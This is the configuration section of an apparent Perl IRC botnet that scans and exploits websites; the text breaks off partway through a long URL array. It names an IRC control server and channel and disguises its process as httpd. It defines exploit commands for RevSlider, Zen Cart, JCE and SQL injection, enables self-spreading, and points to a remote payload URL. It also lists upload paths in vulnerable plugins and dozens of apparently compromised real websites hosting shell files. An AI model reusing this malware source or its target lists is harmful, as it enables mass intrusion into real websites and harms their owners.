#!/usr/bin/perl

 

use HTTP::Request;

use HTTP::Request::Common;

use HTTP::Request::Common qw(POST);

use LWP::Simple;

use LWP 5.64;

use LWP::UserAgent;

use IO::Socket;

use IO::Socket::INET;

use IO::Select;

use Socket;

use MIME::Base64;

use File::Basename;

use URI::Escape;

use Digest::MD5 qw(md5_hex);

#use DBI;

 

my $datetime    = localtime;

my $fakeproc    = "/usr/sbin/httpd";

my $ircserver   = "irc.perl.org";

my $ircport   	= "6667";

my $number      = int(rand(10));

my $nickname	= "Norbert[".$number."]";

my $ident       = "bot".$number;

my $chan	    = "#rulex";

my $chanx   	= "#rulex";

my $admin       = "rulex";

my $base		= "sHoOcK";

my $fullname 	= "9[ 15aanK4FM9 ]";

my $nob0dy  	= "9[ 15aanK4FM9 ]";

my $logo 	 	= "9[ 15aanK4FM9 ]";

my $DBlogo 		= "9[ 15DB4HacK9 ]";



my $ftplogo		= "9[ 15FTP4Hack9 ]";

my $bplogo		= "9[ 15By4Pass9 ]";

my $cfxlogo 	= "9[ 15Con4tact9 ]";

my $hdflogo 	= "9[ 15HD4Flvplayer9 ]";

my $adslogo		= "9[ 15Ads4Manager9 ]";

my $maglogo 	= "9[ 15Mag4Entot9 ]";

my $magslogo 	= "9[ 15Mag4eXPo9 ]";

my $jcelogo 	= "9[ 15JC4E9 ]";

my $cckjlogo    = "9[ 15CC4KJ9 ]";

my $sqllogo     = "9[ 15SQ4L9 ]";

 

my $searchlogo  = "9[ 15Surf4ing9 ]";

my $rsqllogo    = "9[ 15DB4Rev9 ]";

my $revlogo     = "9[ 15Rev4Slider9 ]";

my $jdllogo		= "9[ 15Com4Jdownloads9 ]";

my $zenlogo     = "9[ 15Zen4Cart9 ]";

my $esqllogo    = "9[ 15eS4qL9 ]";



my $revcmd      = "!rev".$number;

my $cfxcmd		= "!cfx".$number;

my $hdfcmd		= "!hdf".$number;

my $zencmd      = "!zen".$number;

my $jdlcmd		= "!don".$number;

my $adscmd		= "!ads".$number;

my $magcmd		= "!mag".$number;

my $jcecmd		= "!jce".$number;

my $magscmd		= "!mags".$number;

my $cckjcmd		= "!cckj".$number;

my $sqlcmd		= "!sql".$number;

my $esqlcmd  	= "!sqle".$number;



my $chkcmd     = "!chk".$number;



my $plugin      = "revslider";

my $action      = "revslider_ajax_action";

my $update_file = "revslider.zip";



my $zenfile     = "myluph.PHP";

my $pubscan     = 1;

my $spread      = 1;

my $blackunix   = "http://flickr.com.sapkaatolyesi.com/rox.php"; #http://www.1plus1.am/lib/

my $bulusukan	= "http://flickr.com.sapkaatolyesi.com/rox.php";

my $badsite   	= "sectools.org|100torrent.com|logs|access_log|google|yahoo|securityaffairs|youtube.com|packetstormsecurity|github|awstats|stackoverflow|archive-cu.com|joomlaforum.ru|stackoverflow.com|archive-ca.com";



my @unix 			= ("/framework/plugins/revslider/temp/update_extract/","/lib/revslider/temp/update_extract/","/script/revslider/temp/update_extract/","/framework/modules/revslider/temp/update_extract/","/revslider/temp/update_extract/","/classes/revslider/temp/update_extract/","/plugins/revslider/temp/update_extract/","/advance/plugins/revslider/temp/update_extract/","/wonderfoundry/addons/plugins/revslider/temp/update_extract/","/revslider/temp/update_extract/","/js/revslider/temp/update_extract/","/minimax/modules/revslider/temp/update_extract/","/library/revslider/temp/update_extract/","/sections/revslider/temp/update_extract/","/framework/tmp/revslider/temp/update_extract/","/Lioit/revslider/temp/update_extract/","/theme/templates/sliders/revslider/temp/update_extract/");

my @umix 			= ("/framework/plugins/showbiz/temp/update_extract/","/lib/showbiz/temp/update_extract/","/script/showbiz/temp/update_extract/","/framework/modules/showbiz/temp/update_extract/","/showbiz/temp/update_extract/","/classes/showbiz/temp/update_extract/","/plugins/showbiz/temp/update_extract/","/advance/plugins/showbiz/temp/update_extract/","/wonderfoundry/addons/plugins/showbiz/temp/update_extract/","/showbiz/temp/update_extract/","/js/showbiz/temp/update_extract/","/minimax/modules/showbiz/temp/update_extract/","/library/showbiz/temp/update_extract/","/sections/showbiz/temp/update_extract/","/framework/tmp/showbiz/temp/update_extract/","/Lioit/showbiz/temp/update_extract/","/theme/templates/sliders/showbiz/temp/update_extract/");

my @kaca 			= ("themes/aries/revslider/temp/update_extract/","themes/beach_apollo/advance/plugins/revslider/temp/update_extract/","themes/incrediblewp/revslider/temp/update_extract/","themes/cuckoobizz/framework/plugins/revslider/temp/update_extract/","themes/paragon/framework/plugins/revslider/temp/update_extract/","themes/striking_r/framework/plugins/revslider/temp/update_extract/","themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/","themes/schema-corporate/classes/revslider/temp/update_extract/","plugins/revslider/temp/update_extract/","themes/medicate/script/revslider/temp/update_extract/","themes/celestino/theme/templates/sliders/revolution-slider/temp/update_extract/","themes/libra/theme/templates/sliders/revolution-slider/temp/update_extract/"."themes/radio/revslider/temp/update_extract/","plugins/revolution-slider/temp/update_extract/","themes/RoyalOak/framework/plugins/revslider/temp/update_extract/","themes/RoyalOak/framework/plugins/revolutin-slider/temp/update_extract/","themes/Avada/framework/plugins/revslider/temp/update_extract/","themes/Avada/framework/plugins/revolution-slider/temp/update_extract/","themes/centum/revslider/temp/update_extract/","themes/centum/revolution-slider/temp/update_extract/","themes/coffeeandcream/includes/revslider/temp/update_extract/","themes/coffeeandcream/includes/revolution-slider/temp/update_extract/","themes/Arham/framework/plugins/revslider/temp/update_extract/","themes/Arham/framework/plugins/revolution-slider/temp/update_extract/");

my @kontakz 	    = ("/cfg-contactform-1/","/cfg-contactform-2/","/cfg-contactform-3/","/cfg-contactform-4/","/cfg-contactform-5/","/cfg-contactform-6/","/cfg-contactform-7/","/cfg-contactform-8/","/cfg-contactform-9/","/cfg-contactform-10/","/cfg-contactform-11/","/cfg-contactform-12/","/cfg-contactform-13/","/cfg-contactform-14/","/cfg-contactform-15/","/cfg-contactform-16/","/cfg-contactform-17/","/cfg-contactform-18/","/cfg-contactform-19/","/cfg-contactform-20/");

my @useragents   	= ("Microsoft Internet Explorer/4.0b1 (Windows 95)","Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)","Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)","Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)","Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)","Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)","Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)","Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)","Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)","Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)","Mozilla/4.0 (compatible; MSIE 7.0b; Win32)","Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)","Microsoft Pocket Internet Explorer/0.6","Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)","MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;","Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)","Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)","Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)","Advanced Browser (http://www.avantbrowser.com)","Avant Browser (http://www.avantbrowser.com)","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)","Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)","Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)","Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511","Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929","Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0","Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox","Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6","Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7","Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4","Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4","Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1","Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1","Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1","Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2","Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b","Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0","Mozilla/3.0 (OS/2; U)","Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)","Mozilla/4.61 (Macintosh; I; PPC)","Mozilla/4.61 [en] (OS/2; U)","Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)","Mozilla/4.8 [en] (Windows NT 5.0; U)");

my @doms  	  		= ("com","ca","org","biz","tv","net","co.uk","com.ar","com.au","com.ae","com.ca","com.mx","co.kr","co.id","fr","de","it","ru");



my $useragent 		= $useragents[rand(scalar(@useragents))];

my $uagent 	        = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6";

my $dom  	 		= $doms[rand(scalar(@doms))];



my @pgfa 			= ( "?____pgfa=https%3A%2F%2Fwww.google.com%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.de%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.co.uk%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.com.my%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.com.sg%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.ru%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.ro%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.de%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.ca%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.fr%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.co.id%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.ru%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.fr%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.de%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.com%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.com.my%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.com.br%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.com.br%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.co.uk%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.ne%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.co.mz%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.com.sg%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.com.mx%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.com.mx%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.de%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.ru%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.ro%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.co.id%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.at%2Fsearch?q=","?____pgfa=https%3A%2F%2Fwww.google.nl%2Fsearch?q="); 



##########################################################################################



my $pgfa  	 		= $pgfa[rand(scalar(@pgfa))];



##################################### By Passer ###########################################



my @randombarner  = ("http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",

					 "http://isanew.grupomathile.com.br/errors.php",

					 "http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php",

					 "http://www.photodesign.uncanny.cz/images/error.php",

"http://www.iscavets.be/administrator/components/com_weblinks/views/errors.php",

					 "http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php",

					 "http://titiprindu.com/errors.php",

					 "http://baldwin-fitness.com/images/error.php",

					 "http://www.solucionesparati.net/CMS2008/images/error.php.1",

					 "http://totalfish.hu/errors.php/errors.php",

					 "http://www.lafutbolera.net/images/error.php",

					 "http://www.ohuihanquoc.vn/components/com_banners/models/error.php",

					 "http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",

					 "http://www.modelismonaval.com/components/com_user/class-mail.php",

					 "http://www.iscavets.be/administrator/components/com_weblinks/views/errors.php",

					 "http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php",

					 "http://www.picturethismenu.com/errors.php",

					 "http://www.solucionesparati.net/CMS2008/images/error.php.1",

					 "http://wavevent.fr/administrator/components/com_weblinks/views/errors.php",

					 "http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",

					 "http://www.rapidsweddings.com/errors.php",

					 "http://www.modelismonaval.com/components/com_user/class-mail.php",

					 "http://www.picturethismenu.com/errors.php",

					 "http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",

					 "http://www.flowdynamicsinc.com/errors.php",

					 "http://wavevent.fr/administrator/components/com_weblinks/views/errors.php",

					 "http://allindustrialcorp.com/errors.php",

					 "http://priorityelectricutility.com/errors.php",

					 "http://all-cylinders.com/errors.php",

					 "http://snscylinders.com/errors.php"

					 );



my @randombarner1  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://p.istu.ru//components/com_mailto/error.php","http://www.telsonet.pl/errors.php","http://www.modelismonaval.com/components/com_user/class-mail.php","http://optim.gim.med.up.pt/components/com_mailto/error.php","http://www.picturethismenu.com/errors.php","http://www.seccons.de/components/com_mailto/error.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://pollenz.net/components/com_banners/error.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner2  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://p.istu.ru//components/com_mailto/error.php","http://www.telsonet.pl/errors.php","http://www.modelismonaval.com/components/com_user/class-mail.php","http://optim.gim.med.up.pt/components/com_mailto/error.php","http://www.picturethismenu.com/errors.php","http://www.seccons.de/components/com_mailto/error.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://pollenz.net/components/com_banners/error.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner3  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://p.istu.ru//components/com_mailto/error.php","http://www.telsonet.pl/errors.php","http://www.modelismonaval.com/components/com_user/class-mail.php","http://optim.gim.med.up.pt/components/com_mailto/error.php","http://www.picturethismenu.com/errors.php","http://www.seccons.de/components/com_mailto/error.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://pollenz.net/components/com_banners/error.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner5  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://p.istu.ru//components/com_mailto/error.php","http://www.telsonet.pl/errors.php","http://www.modelismonaval.com/components/com_user/class-mail.php","http://optim.gim.med.up.pt/components/com_mailto/error.php","http://www.picturethismenu.com/errors.php","http://www.seccons.de/components/com_mailto/error.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://pollenz.net/components/com_banners/error.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner6  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://p.istu.ru//components/com_mailto/error.php","http://www.telsonet.pl/errors.php","http://www.modelismonaval.com/components/com_user/class-mail.php","http://optim.gim.med.up.pt/components/com_mailto/error.php","http://www.picturethismenu.com/errors.php","http://www.seccons.de/components/com_mailto/error.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://pollenz.net/components/com_banners/error.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/er